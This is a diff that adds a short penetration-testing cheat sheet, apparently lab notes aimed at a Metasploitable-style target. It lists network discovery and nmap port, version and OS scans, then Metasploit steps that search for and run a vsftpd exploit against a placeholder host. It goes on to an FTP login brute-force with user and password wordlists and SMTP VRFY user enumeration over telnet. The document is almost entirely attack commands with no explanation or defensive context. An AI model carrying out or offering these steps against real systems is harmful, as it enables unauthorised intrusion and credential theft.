@@ -1,0 +1,21 @@
+netdiscover -r {IP}
+[open wireshark software]
+nmap -sS -p- {IP}
+nmap -sS -sV -O {IP}
+msfconsole
+search vsftpd
+use {exploit name}
+set RHOST {IP}
+show info
+show options
+set VERBOSE true
+show advanced
+run
+search ftp login
+set RHOSTS {IP}
+set USER_FILE {˜/pathway/user.txt}
+set PASS_FILE {˜/pathway/paswd.txt}
+run
+exit
+telnet {IP} {port}
+VRFY admin@gmail.com{or admin or msfadmin or {another email}}
